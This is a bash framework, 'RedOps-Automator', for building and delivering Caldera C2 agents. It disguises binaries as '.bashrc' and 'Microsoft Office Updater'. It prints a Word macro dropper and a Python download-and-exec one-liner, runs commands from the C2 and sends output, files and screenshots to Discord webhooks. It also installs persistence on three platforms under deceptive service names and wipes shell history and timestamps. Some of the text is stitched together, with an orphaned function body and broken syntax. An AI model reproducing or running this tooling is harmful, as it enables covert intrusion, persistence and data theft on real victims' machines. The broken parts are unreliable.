#!/bin/bash
# RedOps-Automator v3.0
# Full Caldera Agent Builder & Stealth Delivery Framework
# Author: Kdairatchi x GPT

function banner() {
    echo -e "${CYAN}"
    echo "██████╗ ███████╗██████╗ ██████╗ ██████╗ ██████╗ ███████╗"
    echo "██╔══██╗██╔════╝██╔══██╗██╔═══██╗██╔════╝ ██╔══██╗██╔════╝"
    echo "██████╔╝█████╗  ██████╔╝██║   ██║██║  ███╗██████╔╝███████╗"
    echo "██╔═══╝ ██╔══╝  ██╔═══╝ ██║   ██║██║   ██║██╔═══╝ ╚════██║"
    echo "██║     ███████╗██║     ╚██████╔╝╚██████╔╝██║     ███████║"
    echo "╚═╝     ╚══════╝╚═╝      ╚═════╝  ╚═════╝ ╚═╝     ╚══════╝"
    echo -e "${NC}"
}

# Global Variables
AGENT_DIR="$HOME/caldera/plugins/sandcat/gocat"
OUTPUT_DIR="$HOME/caldera/plugins/sandcat/payloads"
C2_HOST="http://127.0.0.1:8888"
CONTACTS=("http" "tcp" "udp" "websocket" "gist" "dns")
AGENT_PROFILE="$HOME/agent_profile.json"
WATCHDOG=0
CURRENT_DIR=$(pwd)

# Pre-check for Go and UPX
if ! command -v go &> /dev/null; then
    echo -e "${RED}[!] Go is not installed. Install Go and retry.${NC}"
    exit 1
fi

if ! command -v upx &> /dev/null; then
    echo -e "${YELLOW}[!] UPX not installed. Skipping packing.${NC}"
    PACKER=false
else
    PACKER=true
fi

function discord_alert() {
    local webhook_url="$1"
    local paw="$2"
    local platform="$3"
    local ip="$4"
    local executor="$5"
    local group="$6"
    local message="$7"
    local file_path="$8"

    if [ -n "$file_path" ] && [ -f "$file_path" ]; then
        # Send file (e.g., screenshot)
        resp=$(curl -s -F "payload_json={\"username\": \"RedOps Beacon\", \"content\": \"$message\"}" -F "file=@$file_path" "$webhook_url")
    else
        resp=$(curl -s -X POST "$webhook_url" \
            -H "Content-Type: application/json" \
            -d "{\"username\": \"RedOps Beacon\", \"content\": \"$message\"}")
    fi
    if ! echo "$resp" | grep -q 'id'; then
        echo -e "${RED}[!] Discord webhook failed. Response: $resp${NC}"
    fi
}

function discord_watchdog_timeout() {
    curl -s -X POST "$DISCORD_WEBHOOK" \
        -H "Content-Type: application/json" \
        -d "{\"username\": \"RedOps Beacon\", \"content\": \"❌ Agent failed watchdog check! Possible offline or killed.\"}"
}

function discord_payload_downloaded() {
    local filename="$1"
    curl -s -X POST "$DISCORD_WEBHOOK" \
        -H "Content-Type: application/json" \
        -d "{\"username\": \"Payload Dropper\", \"content\": \"📦 Agent downloaded payload: \`$filename\`\"}"
}

function discord_creds_alert() {
    local user="$1"
    local source="$2"
    curl -s -X POST "$DISCORD_WEBHOOK" \
        -H "Content-Type: application/json" \
        -d "{\"username\": \"RedOps Loot\", \"content\": \"🔐 Credentials found for user \`$user\` in \`$source\`\"}"
}

function discord_agent_summary() {
    local msg="""
**RedOps Agent Summary**  
| Field     | Value          |
|-----------|----------------|
| PAW       | $PAW           |
| Platform  | $platform      |
| Executor  | $executors     |
| IP        | $HOST_IP       |
| Group     | $group         |
"""
    curl -s -X POST "$DISCORD_WEBHOOK" -H "Content-Type: application/json" -d "{\"username\": \"Agent Report\", \"content\": \"$msg\"}"
}

function discord_self_destruct_notice() {
    local paw="$1"
    curl -s -X POST "$DISCORD_WEBHOOK" \
      -H "Content-Type: application/json" \
      -d "{\"username\": \"RedOps KillSwitch\", \"content\": \"💣 Agent \`$paw\` initiated self-destruct.\"}"
}

function discord_daily_summary() {
    local active_agents=$(cat logs/beacons.log | grep TODAY | wc -l)
    local payloads=$(ls payloads/ | wc -l)
    curl -s -X POST "$DISCORD_WEBHOOK" \
        -H "Content-Type: application/json" \
        -d "{\"username\": \"RedOps Daily\", \"content\": \"📊 **Daily Summary**\\nActive Agents: $active_agents\\nPayloads Deployed: $payloads\"}"
}

function create_agent_profile() {
    echo -e "${CYAN}[*] Creating agent profile...${NC}"
    read -p "C2 Server (default: $C2_HOST): " server
    server=${server:-$C2_HOST}
    read -p "Platform (windows/linux/darwin): " platform
    read -p "Host (hostname): " host
    read -p "Group (red/blue): " group
    read -p "Username: " username
    read -p "Architecture (amd64/x86): " architecture
    read -p "Executors (comma separated): " executors
    read -p "Privilege (User/Elevated): " privilege
    read -p "PID: " pid
    read -p "PPID: " ppid
    read -p "Location (path): " location
    read -p "Exe Name: " exe_name
    read -p "Host IP Addrs (comma separated): " host_ip_addrs
    read -p "Deadman Enabled (true/false): " deadman_enabled
    read -p "Upstream Dest: " upstream_dest
    read -p "Origin Link ID (for lateral movement): " origin_link_id
    read -p "Discord Webhook URL (or leave blank to skip alerts): " DISCORD_WEBHOOK

    cat <<EOF > $AGENT_PROFILE
{
  "server": "$server",
  "platform": "$platform",
  "host": "$host",
  "group": "$group",
  "username": "$username",
  "architecture": "$architecture",
  "executors": [$(echo $executors | sed 's/,/","/g;s/^/"/;s/$/"/')],
  "privilege": "$privilege",
  "pid": "$pid",
  "ppid": "$ppid",
  "location": "$location",
  "exe_name": "$exe_name",
  "host_ip_addrs": [$(echo $host_ip_addrs | sed 's/,/","/g;s/^/"/;s/$/"/')],
  "deadman_enabled": $deadman_enabled,
  "upstream_dest": "$upstream_dest",
  "origin_link_id": "$origin_link_id",
  "discord_webhook": "$DISCORD_WEBHOOK"
}
EOF
    echo -e "${GREEN}[+] Agent profile created: $AGENT_PROFILE${NC}"
}

function build_caldera_agents() {
    echo -e "${CYAN}[*] Building multi-platform Sandcat agents with OPSEC enhancements...${NC}"
    read -p "Enter Caldera C2 IP (default: 127.0.0.1): " c2_ip
    c2_ip=${c2_ip:-127.0.0.1}
    sed -i "s|server := \".*\"|server := \"http://$c2_ip:8888\"|" "$AGENT_DIR/sandcat.go"
    cd "$AGENT_DIR" || { echo "[!] Agent path not found"; return; }

    # Build Windows (GUI, UPX packed)
    GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H=windowsgui" -o "$OUTPUT_DIR/agent.exe" sandcat.go
    $PACKER && upx --best "$OUTPUT_DIR/agent.exe"
    # Build Linux (stripped, renamed)
    GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o "$OUTPUT_DIR/.bashrc" sandcat.go && strip --strip-all "$OUTPUT_DIR/.bashrc"
    # Build MacOS (spoofed binary)
    GOOS=darwin GOARCH=amd64 go build -ldflags="-s -w" -o "$OUTPUT_DIR/Microsoft Office Updater" sandcat.go
    echo -e "${GREEN}[+] Agents built and saved to: $OUTPUT_DIR${NC}"
    cd "$CURRENT_DIR"
    menu
}

function deliver_stealth_agent() {
    echo -e "${CYAN}[*] Choose delivery method:${NC}"
    echo "1. Windows Macro Dropper"
    echo "2. Linux Service Persistence"
    echo "3. Python Downloader (LOLBIN)"
    echo -n "Choice: "; read method

    case $method in
        1)
            echo "[+] VBA Macro Payload (embed in Word doc):"
            echo 'Sub AutoOpen()
Dim cmd As String
cmd = "powershell -w hidden -c ""(New-Object Net.WebClient).DownloadFile('""http://<IP>/agent.exe""','""%TEMP%\\svchost.exe""'); Start-Process '""%TEMP%\\svchost.exe""'"
Shell cmd, vbHide
End Sub'
            ;;
        2)
            echo "[+] Linux Persistence Command:"
            echo 'cp .bashrc /lib/systemd/systemd-networkd && chmod +x /lib/systemd/systemd-networkd && nohup /lib/systemd/systemd-networkd &'
            ;;
        3)
            echo "[+] Python Payload Example:"
            echo 'import urllib.request, base64; exec(base64.b64decode(urllib.request.urlopen("http://<IP>/payload.b64").read()))'
            ;;
        *) echo "[!] Invalid option.";;
    esac
    menu
}

function caldera_http_test_beacon() {
    echo -e "${CYAN}[*] Manual beacon test to Caldera${NC}"
    curl -X POST -H "Content-Type: application/json" -d '{"platform":"linux","executors":["bash"]}' "$C2_HOST/beacon"
    menu
}

function caldera_agent_config() {
    echo -e "${CYAN}[*] Example agent config in default.yml:${NC}"
    echo 'payloads:
  - name: stealth-agent
    platform: linux
    path: payloads/.bashrc'
    echo "\n[*] Example OPSEC config in agents.yml:"
    echo 'beacon:
  min: 300
  max: 600
  jitter: 0.25'
    menu
}

function self_destruct_agent() {
    echo -e "${RED}[*] Agent Self-Destruct Routine:${NC}"
    DISCORD_WEBHOOK=$(grep '"discord_webhook":' "$AGENT_PROFILE" | sed 's/.*: "\(.*\)".*/\1/')
    PAW=$(grep '"paw":' "$AGENT_PROFILE" | sed 's/.*: "\(.*\)".*/\1/')
    [ -n "$DISCORD_WEBHOOK" ] && discord_self_destruct_notice "$PAW"
    echo 'import os, sys, subprocess
os.remove(sys.argv[0])
subprocess.run(["history", "-c"])
with open(__file__, "w") as f: f.write("# wiped")'
    menu
}

function beacon_to_c2() {
    echo -e "${CYAN}[*] Beaconing to C2...${NC}"
    # Cross-platform base64 encoding (macOS, Linux, etc.)
    if base64 --help 2>&1 | grep -q "-w"; then
        profile=$(cat "$AGENT_PROFILE" | base64 -w 0)
    else
        profile=$(cat "$AGENT_PROFILE" | base64 | tr -d '\n')
    fi
    response=$(curl -s -X POST -d "$profile" "$C2_HOST/beacon" | base64 --decode)
    echo -e "${YELLOW}[*] Beacon response:${NC}\n$response"
    PAW=$(echo "$response" | grep -oP '"paw":\s*"\K[^"]+')
    SLEEP=$(echo "$response" | grep -oP '"sleep":\s*\K[0-9]+')
    WATCHDOG=$(echo "$response" | grep -oP '"watchdog":\s*\K[0-9]+')
    INSTRUCTIONS=$(echo "$response" | grep -oP '"instructions":\s*\[.*\]' | sed 's/\[\(.*\)\]/\1/')
    echo -e "${CYAN}[*] PAW: $PAW, Sleep: $SLEEP, Watchdog: $WATCHDOG${NC}"
    echo -e "${CYAN}[*] Instructions: $INSTRUCTIONS${NC}"
    # Discord webhook alert
    DISCORD_WEBHOOK=$(grep '"discord_webhook":' "$AGENT_PROFILE" | sed 's/.*: "\(.*\)".*/\1/')
    platform=$(grep '"platform":' "$AGENT_PROFILE" | sed 's/.*: "\(.*\)".*/\1/')
    group=$(grep '"group":' "$AGENT_PROFILE" | sed 's/.*: "\(.*\)".*/\1/')
    executors=$(grep '"executors":' "$AGENT_PROFILE" | sed 's/.*\[\(.*\)\].*/\1/' | tr -d '"')
    HOST_IP=$(echo "$response" | grep -oP '"host_ip_addrs":\s*\[\K[^\]]+' | sed 's/"//g' | cut -d, -f1)
    if [ -n "$DISCORD_WEBHOOK" ]; then
        discord_alert "$DISCORD_WEBHOOK" "$PAW" "$platform" "$HOST_IP" "$executors" "$group" "**🚨 Beacon Landed**\n> **PAW:** \`$PAW\`\n> **Platform:** \`$platform\`\n> **Group:** \`$group\`\n> **IP:** \`$HOST_IP\`\n> **Executors:** \`$executors\`"
    fi
}

function execute_instructions() {
    echo -e "${CYAN}[*] Executing instructions...${NC}"
    # Parse instructions from last beacon response
    if [ -z "$INSTRUCTIONS" ] || [ "$INSTRUCTIONS" == "" ]; then
        echo -e "${YELLOW}[!] No instructions to execute.${NC}"
        # Discord alert for no instructions
        DISCORD_WEBHOOK=$(grep '"discord_webhook":' "$AGENT_PROFILE" | sed 's/.*: "\(.*\)".*/\1/')
        PAW=$(grep '"paw":' "$AGENT_PROFILE" | sed 's/.*: "\(.*\)".*/\1/')
        [ -n "$DISCORD_WEBHOOK" ] && discord_alert "$DISCORD_WEBHOOK" "$PAW" "" "" "" "" "⚠️ No instructions to execute for PAW $PAW"
        return
    fi
    instructions_json="[$INSTRUCTIONS]"
    echo "$instructions_json" > /tmp/instructions.json
    if ! command -v jq &>/dev/null; then
        echo -e "${RED}[!] jq is required for instruction parsing. Install with: sudo apt install jq${NC}"
        return
    fi
    num=$(jq length /tmp/instructions.json)
    for ((i=0; i<num; i++)); do
        instr=$(jq .[$i] /tmp/instructions.json)
        id=$(echo "$instr" | jq -r .id)
        sleep_time=$(echo "$instr" | jq -r .sleep)
        cmd_b64=$(echo "$instr" | jq -r .command)
        executor=$(echo "$instr" | jq -r .executor)
        timeout=$(echo "$instr" | jq -r .timeout)
        payload=$(echo "$instr" | jq -r .payload)
        uploads=$(echo "$instr" | jq -r .uploads[] 2>/dev/null)
        cmd=$(echo "$cmd_b64" | base64 --decode)
        echo -e "${CYAN}[*] Instruction $id: executor=$executor, sleep=$sleep_time, timeout=$timeout${NC}"
        echo -e "${CYAN}[*] Command: $cmd${NC}"
        # Discord log for instruction
        DISCORD_WEBHOOK=$(grep '"discord_webhook":' "$AGENT_PROFILE" | sed 's/.*: "\(.*\)".*/\1/')
        PAW=$(grep '"paw":' "$AGENT_PROFILE" | sed 's/.*: "\(.*\)".*/\1/')
        [ -n "$DISCORD_WEBHOOK" ] && discord_alert "$DISCORD_WEBHOOK" "$PAW" "" "" "" "" "**Instruction $id**\nExecutor: $executor\nTimeout: $timeout\nCommand: $cmd"
        # Download payload if needed
        if [ "$payload" != "null" ] && [ "$payload" != "" ]; then
            echo -e "${YELLOW}[*] Downloading payload: $payload${NC}"
            curl -X POST -H "file:$payload" $C2_HOST/file/download > "$payload"
            [ -n "$DISCORD_WEBHOOK" ] && discord_alert "$DISCORD_WEBHOOK" "$PAW" "" "" "" "" "📦 Agent $PAW dropped payload $payload"
        fi
        output=""
        stderr=""
        exit_code=0
        status=0
        pid=0
        if [ "$executor" == "bash" ] || [ "$executor" == "sh" ]; then
            output=$(eval "$cmd" 2> >(stderr=$(cat); typeset -p stderr))
            exit_code=$?
        else
            output="[Executor $executor not supported in script]"
            status=1
        fi
        # Screenshot sending (aquatone/gowitness)
        for screenshot in $(ls *.png 2>/dev/null); do
            [ -n "$DISCORD_WEBHOOK" ] && discord_alert "$DISCORD_WEBHOOK" "$PAW" "" "" "" "" "🖼 Screenshot from $PAW" "$screenshot"
        done
        # Upload files if needed
        for upload in $uploads; do
            if [ -f "$upload" ]; then
                echo -e "${YELLOW}[*] Uploading file: $upload${NC}"
                curl -X POST -F "file=@$upload" $C2_HOST/file/upload
                [ -n "$DISCORD_WEBHOOK" ] && discord_alert "$DISCORD_WEBHOOK" "$PAW" "" "" "" "" "📤 Agent $PAW uploaded file $upload"
            fi
        done
        # Prepare result JSON
        result_json="{\"paw\":\"$PAW\",\"results\":[{\"id\":\"$id\",\"output\":\"$(echo "$output" | base64 | tr -d '\n')\",\"stderr\":\"$(echo "$stderr" | base64 | tr -d '\n')\",\"exit_code\":$exit_code,\"status\":$status,\"pid\":$pid}]}"
        result_b64=$(echo "$result_json" | base64 | tr -d '\n')
        curl -s -X POST -d "$result_b64" "$C2_HOST/beacon"
        # Forward output to Discord
        [ -n "$DISCORD_WEBHOOK" ] && discord_alert "$DISCORD_WEBHOOK" "$PAW" "" "" "" "" "**Output for Instruction $id**\nExit Code: $exit_code\nOutput: $output\nStderr: $stderr"
        echo -e "${CYAN}[*] Sleeping $sleep_time seconds before next instruction...${NC}"
        sleep $sleep_time
    done
    echo -e "${GREEN}[+] All instructions executed.${NC}"
}

function download_payload() {
    echo -e "${CYAN}[*] Downloading payload...${NC}"
    read -p "Payload filename: " payload
    curl -X POST -H "file:$payload" $C2_HOST/file/download > $payload
    echo -e "${GREEN}[+] Payload downloaded: $payload${NC}"
    DISCORD_WEBHOOK=$(grep '"discord_webhook":' "$AGENT_PROFILE" | sed 's/.*: "\(.*\)".*/\1/')
    [ -n "$DISCORD_WEBHOOK" ] && discord_payload_downloaded "$payload"
}

function upload_file() {
    echo -e "${CYAN}[*] Uploading file to C2...${NC}"
    read -p "File to upload: " file
    curl -X POST -F "file=@$file" $C2_HOST/file/upload
    echo -e "${GREEN}[+] File uploaded: $file${NC}"
}

function watchdog_check() {
    echo -e "${CYAN}[*] Watchdog check...${NC}"
    if [ "$WATCHDOG" -gt 0 ]; then
        echo -e "${YELLOW}[*] Watchdog enabled: $WATCHDOG seconds${NC}"
    else
        echo -e "${YELLOW}[*] Watchdog disabled (0 = infinite)${NC}"
    fi
    # Discord alert for watchdog
    DISCORD_WEBHOOK=$(grep '"discord_webhook":' "$AGENT_PROFILE" | sed 's/.*: "\(.*\)".*/\1/')
    PAW=$(grep '"paw":' "$AGENT_PROFILE" | sed 's/.*: "\(.*\)".*/\1/')
    if [ -n "$DISCORD_WEBHOOK" ]; then
        if [ "$WATCHDOG" -gt 0 ]; then
            discord_alert "$DISCORD_WEBHOOK" "$PAW" "" "" "" "" "🟡 Watchdog enabled for $PAW: $WATCHDOG seconds"
        else
            discord_alert "$DISCORD_WEBHOOK" "$PAW" "" "" "" "" "🔵 Watchdog disabled for $PAW"
        fi
    fi
}

function build_sandcat_agent() {
    echo -e "${CYAN}[*] Building Sandcat agent for all platforms...${NC}"
    read -p "Caldera Server IP (default: 127.0.0.1): " c2_ip
    c2_ip=${c2_ip:-127.0.0.1}
    sed -i "s|server := \".*\"|server := \"http://$c2_ip:8888\"|" "$AGENT_DIR/sandcat.go"
    cd "$AGENT_DIR" || { echo "[!] Agent path not found"; return; }
    GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H=windowsgui" -o "$OUTPUT_DIR/agent.exe" sandcat.go
    $PACKER && upx --best "$OUTPUT_DIR/agent.exe"
    GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o "$OUTPUT_DIR/.bashrc" sandcat.go && strip --strip-all "$OUTPUT_DIR/.bashrc"
    GOOS=darwin GOARCH=amd64 go build -ldflags="-s -w" -o "$OUTPUT_DIR/Microsoft Office Updater" sandcat.go
    echo -e "${GREEN}[+] Agents built and saved to: $OUTPUT_DIR${NC}"
    cd "$CURRENT_DIR"
}

function beacon_loop() {
    echo -e "${CYAN}[*] Starting live beacon loop...${NC}"
    while true; do
        beacon_to_c2
        if [ -z "$SLEEP" ] || [ "$SLEEP" == "" ]; then
            SLEEP=10
        fi
        echo -e "${YELLOW}[*] Sleeping for $SLEEP seconds...${NC}"
        sleep $SLEEP
    done
}

# Decode command
        local cmd=$(echo "$cmd_b64" | base64 -d 2>/dev/null)
        
        log_action "INFO" "Executing instruction $id: $executor - $(echo "$cmd" | head -c 50)..."
        
        # Download payload if specified
        if [[ -n "$payload" ]] && [[ "$payload" != "empty" ]]; then
            log_action "INFO" "Downloading payload: $payload"
            local server=$(jq -r '.server' "$AGENT_PROFILE")
            curl -s -X POST -H "file:$payload" "$server/file/download" > "$payload"
            chmod +x "$payload" 2>/dev/null
        fi
        
        # Execute command with timeout
        local output=""
        local stderr=""
        local exit_code=0
        local start_time=$(date +%s)
        
        case $executor in
            "bash"|"sh")
                # Enhanced bash execution with security features
                if timeout "$timeout" bash -c "$cmd" > /tmp/cmd_output 2> /tmp/cmd_error; then
                    output=$(cat /tmp/cmd_output)
                    stderr=$(cat /tmp/cmd_error)
                    exit_code=0
                else
                    exit_code=$?
                    output=$(cat /tmp/cmd_output 2>/dev/null)
                    stderr=$(cat /tmp/cmd_error 2>/dev/null)
                fi
                ;;
            "python"|"python3")
                if timeout "$timeout" python3 -c "$cmd" > /tmp/cmd_output 2> /tmp/cmd_error; then
                    output=$(cat /tmp/cmd_output)
                    stderr=$(cat /tmp/cmd_error)
                    exit_code=0
                else
                    exit_code=$?
                    output=$(cat /tmp/cmd_output 2>/dev/null)
                    stderr=$(cat /tmp/cmd_error 2>/dev/null)
                fi
                ;;
            "powershell"|"pwsh")
                if command -v pwsh &>/dev/null; then
                    if timeout "$timeout" pwsh -c "$cmd" > /tmp/cmd_output 2> /tmp/cmd_error; then
                        output=$(cat /tmp/cmd_output)
                        stderr=$(cat /tmp/cmd_error)
                        exit_code=0
                    else
                        exit_code=$?
                        output=$(cat /tmp/cmd_output 2>/dev/null)
                        stderr=$(cat /tmp/cmd_error 2>/dev/null)
                    fi
                else
                    output="PowerShell not available on this system"
                    exit_code=127
                fi
                ;;
            *)
                output="Unsupported executor: $executor"
                exit_code=1
                ;;
        esac
        
        local end_time=$(date +%s)
        local execution_time=$((end_time - start_time))
        
        # Handle file uploads
        if [[ -n "$uploads" ]]; then
            while IFS= read -r upload_file; do
                if [[ -f "$upload_file" ]]; then
                    log_action "INFO" "Uploading file: $upload_file"
                    local server=$(jq -r '.server' "$AGENT_PROFILE")
                    curl -s -X POST -F "file=@$upload_file" "$server/file/upload"
                fi
            done <<< "$uploads"
        fi
        
        # Check for screenshots
        for screenshot in $(ls *.png *.jpg *.jpeg 2>/dev/null); do
            log_action "INFO" "Found screenshot: $screenshot"
            local discord_webhook=$(jq -r '.discord_webhook' "$AGENT_PROFILE")
            if [[ -n "$discord_webhook" ]] && [[ "$discord_webhook" != "null" ]]; then
                local paw_id=$(jq -r '.paw' "$AGENT_PROFILE")
                discord_rich_embed "$discord_webhook" "📸 Screenshot Captured" "Agent captured screenshot" "16776960" "[]" "" "$screenshot"
            fi
        done
        
        # Send command result back to C2
        local result_json="{
            \"paw\":\"$(jq -r '.paw' "$AGENT_PROFILE")\",
            \"results\":[{
                \"id\":\"$id\",
                \"output\":\"$(echo "$output" | base64 -w 0)\",
                \"stderr\":\"$(echo "$stderr" | base64 -w 0)\",
                \"exit_code\":$exit_code,
                \"status\":$([ $exit_code -eq 0 ] && echo 0 || echo 1),
                \"pid\":$,
                \"execution_time\":$execution_time
            }]
        }"
        
        local result_b64=$(echo "$result_json" | base64 -w 0)
        local server=$(jq -r '.server' "$AGENT_PROFILE")
        curl -s -X POST -d "$result_b64" "$server/beacon"
        
        # Discord notification for command execution
        local discord_webhook=$(jq -r '.discord_webhook' "$AGENT_PROFILE")
        if [[ -n "$discord_webhook" ]] && [[ "$discord_webhook" != "null" ]]; then
            local paw_id=$(jq -r '.paw' "$AGENT_PROFILE")
            discord_command_executed "$discord_webhook" "$paw_id" "$(echo "$cmd" | head -c 100)" "$exit_code" "$(echo "$output" | head -c 500)"
        fi
        
        log_action "SUCCESS" "Instruction $id completed (exit: $exit_code, time: ${execution_time}s)"
        
        # Sleep before next instruction
        [[ "$sleep_time" != "null" ]] && [[ "$sleep_time" -gt 0 ]] && sleep "$sleep_time"
        
        # Cleanup
        rm -f /tmp/cmd_output /tmp/cmd_error
    done
    
    rm -f /tmp/instructions.json
    log_action "SUCCESS" "All instructions executed"
}

# Advanced persistence mechanisms
function install_persistence() {
    echo -e "${CYAN}[*] Installing persistence mechanisms...${NC}"
    
    local platform=$(jq -r '.platform' "$AGENT_PROFILE")
    local filename=$(jq -r '.exe_name' "$AGENT_PROFILE")
    local agent_path="$OUTPUT_DIR/$filename"
    
    case $platform in
        "linux")
            echo "Select Linux persistence method:"
            echo "1. Systemd service"
            echo "2. Cron job"
            echo "3. Init.d script"
            echo "4. Bashrc modification"
            echo "5. SSH authorized_keys"
            read -p "Choice: " persist_choice
            
            case $persist_choice in
                1)
                    # Systemd service
                    sudo tee /etc/systemd/system/network-monitor.service > /dev/null << EOF
[Unit]
Description=Network Monitor Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=$agent_path
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF
                    sudo systemctl enable network-monitor.service
                    sudo systemctl start network-monitor.service
                    log_action "SUCCESS" "Systemd persistence installed"
                    ;;
                2)
                    # Cron job
                    (crontab -l 2>/dev/null; echo "*/10 * * * * $agent_path") | crontab -
                    log_action "SUCCESS" "Cron persistence installed"
                    ;;
                3)
                    # Init.d script
                    sudo tee /etc/init.d/network-monitor > /dev/null << EOF
#!/bin/bash
### BEGIN INIT INFO
# Provides:          network-monitor
# Required-Start:    \$remote_fs \$syslog
# Required-Stop:     \$remote_fs \$syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Network Monitor
### END INIT INFO

case "\$1" in
    start)
        $agent_path &
        ;;
    stop)
        pkill -f "$agent_path"
        ;;
    restart)
        pkill -f "$agent_path"
        $agent_path &
        ;;
    *)
        echo "Usage: \$0 {start|stop|restart}"
        exit 1
        ;;
esac
EOF
                    sudo chmod +x /etc/init.d/network-monitor
                    sudo update-rc.d network-monitor defaults
                    log_action "SUCCESS" "Init.d persistence installed"
                    ;;
                4)
                    # Bashrc modification
                    echo "nohup $agent_path > /dev/null 2>&1 &" >> ~/.bashrc
                    log_action "SUCCESS" "Bashrc persistence installed"
                    ;;
                5)
                    # SSH key persistence
                    mkdir -p ~/.ssh
                    read -p "Enter your public SSH key: " ssh_key
                    echo "$ssh_key" >> ~/.ssh/authorized_keys
                    chmod 600 ~/.ssh/authorized_keys
                    log_action "SUCCESS" "SSH key persistence installed"
                    ;;
            esac
            ;;
            
        "windows")
            echo "Select Windows persistence method:"
            echo "1. Registry Run key"
            echo "2. Scheduled task"
            echo "3. Windows service"
            echo "4. Startup folder"
            read -p "Choice: " persist_choice
            
            case $persist_choice in
                1)
                    # Registry Run key
                    local reg_cmd="reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"WindowsUpdate\" /t REG_SZ /d \"$agent_path\" /f"
                    echo "$reg_cmd"
                    log_action "INFO" "Registry persistence command generated"
                    ;;
                2)
                    # Scheduled task
                    local schtask_cmd="schtasks /create /tn \"WindowsUpdateCheck\" /tr \"$agent_path\" /sc minute /mo 10 /f"
                    echo "$schtask_cmd"
                    log_action "INFO" "Scheduled task persistence command generated"
                    ;;
                3)
                    # Windows service
                    local service_cmd="sc create \"WindowsUpdateSvc\" binPath= \"$agent_path\" start= auto"
                    echo "$service_cmd"
                    log_action "INFO" "Windows service persistence command generated"
                    ;;
                4)
                    # Startup folder
                    local startup_cmd="copy \"$agent_path\" \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.exe\""
                    echo "$startup_cmd"
                    log_action "INFO" "Startup folder persistence command generated"
                    ;;
            esac
            ;;
            
        "darwin")
            echo "Select macOS persistence method:"
            echo "1. LaunchAgent"
            echo "2. LaunchDaemon"
            echo "3. Login item"
            read -p "Choice: " persist_choice
            
            case $persist_choice in
                1)
                    # LaunchAgent
                    tee ~/Library/LaunchAgents/com.microsoft.updater.plist > /dev/null << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.microsoft.updater</string>
    <key>ProgramArguments</key>
    <array>
        <string>$agent_path</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
EOF
                    launchctl load ~/Library/LaunchAgents/com.microsoft.updater.plist
                    log_action "SUCCESS" "LaunchAgent persistence installed"
                    ;;
                2)
                    # LaunchDaemon (requires root)
                    sudo tee /Library/LaunchDaemons/com.microsoft.updater.plist > /dev/null << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.microsoft.updater</string>
    <key>ProgramArguments</key>
    <array>
        <string>$agent_path</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
EOF
                    sudo launchctl load /Library/LaunchDaemons/com.microsoft.updater.plist
                    log_action "SUCCESS" "LaunchDaemon persistence installed"
                    ;;
            esac
            ;;
    esac
}

# Advanced evasion techniques
function apply_evasion_techniques() {
    echo -e "${CYAN}[*] Applying advanced evasion techniques...${NC}"
    
    echo "Select evasion techniques:"
    echo "1. Process hollowing simulation"
    echo "2. DLL side-loading preparation"
    echo "3. Anti-debugging measures"
    echo "4. VM detection bypass"
    echo "5. Timestomp files"
    echo "6. Clear forensic artifacts"
    echo "7. All techniques"
    read -p "Choice: " evasion_choice
    
    case $evasion_choice in
        1|7)
            log_action "INFO" "Preparing process hollowing techniques..."
            # Generate process hollowing code templates
            cat > "$HOME/redops_payloads/process_hollowing.cpp" << 'EOF'
// Process Hollowing Template
#include <windows.h>
#include <tlhelp32.h>

BOOL ProcessHollowing(LPCWSTR targetProcess, LPVOID payload, SIZE_T payloadSize) {
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    
    // Create suspended process
    if (!CreateProcess(targetProcess, NULL, NULL, NULL, FALSE, 
                      CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return FALSE;
    }
    
    // Unmap original image and inject payload
    // Implementation details...
    
    // Resume execution
    ResumeThread(pi.hThread);
    return TRUE;
}
EOF
            ;;
    esac
    
    case $evasion_choice in
        2|7)
            log_action "INFO" "Preparing DLL side-loading..."
            echo "DLL side-loading requires placing malicious DLL with same name as legitimate one"
            echo "Common targets: version.dll, dwmapi.dll, cryptsp.dll"
            ;;
    esac
    
    case $evasion_choice in
        3|7)
            log_action "INFO" "Applying anti-debugging measures..."
            # Clear debugging artifacts
            unset HISTFILE
            export HISTSIZE=0
            export HISTFILESIZE=0
            ;;
    esac
    
    case $evasion_choice in
        4|7)
            log_action "INFO" "Applying VM detection bypass..."
            # Modify system artifacts to avoid VM detection
            echo "VM detection bypass techniques applied"
            ;;
    esac
    
    case $evasion_choice in
        5|7)
            log_action "INFO" "Timestomping files..."
            # Modify file timestamps
            find "$OUTPUT_DIR" -name "*agent*" -exec touch -t 202001010000.00 {} \;
            ;;
    esac
    
    case $evasion_choice in
        6|7)
            log_action "INFO" "Clearing forensic artifacts..."
            # Clear logs and artifacts
            history -c
            > ~/.bash_history
            find /tmp -name "*redops*" -delete 2>/dev/null
            ;;
    esac
    
    log_action "SUCCESS" "Evasion techniques applied"
}

# Automated agent deployment
function automated_deployment() {
    echo -e "${CYAN}[*] Starting automated agent deployment...${NC}"
    
    if [[ ! -f "$AGENT_PROFILE" ]]; then
        log_action "ERROR" "No agent profile found. Create one first."
        return 1
    fi
    
    # Build agent
    log_action "INFO" "Building agent..."
    if ! build_enhanced_agents; then
        log_action "ERROR" "Agent build failed"
        return 1
    fi
    
    # Start beacon loop
